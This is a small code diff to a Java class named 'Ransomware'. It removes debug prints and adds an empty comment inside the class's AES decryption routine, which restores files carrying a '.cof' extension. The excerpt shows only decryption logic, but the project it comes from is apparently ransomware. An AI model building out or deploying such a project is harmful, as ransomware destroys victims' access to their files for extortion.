@@ -64,7 +64,6 @@ public class Ransomware {
 		mode = DECRYPT;
 		secretKeyString = secretKeyString.replaceAll("\\n", "").replace("\\r", "")
 				.replace("-----BEGIN PRIVATE KEY-----", "").replace("-----END PRIVATE KEY-----", "");
-		System.out.println(secretKeyString);
 		try {
 			SecretKey secretKey = new SecretKeySpec(Base64.getDecoder().decode(secretKeyString), 0,
 					Base64.getDecoder().decode(secretKeyString).length, "AES");
@@ -119,10 +118,13 @@ public class Ransomware {
 
 	}
 
+	/**
+	 * 
+	 * @param encryptedFile
+	 */
 	private void decryptFile(File encryptedFile) {
 		byte[] decryptedBytes = null;
 		try {
-			System.out.print(getFileInBytes(encryptedFile).length % 16);
 			decryptedBytes = cipher.doFinal(getFileInBytes(encryptedFile));
 			File decryptedFile = new File(encryptedFile.getPath().replace(".cof", ""));
 			writeToFile(decryptedFile, decryptedBytes);
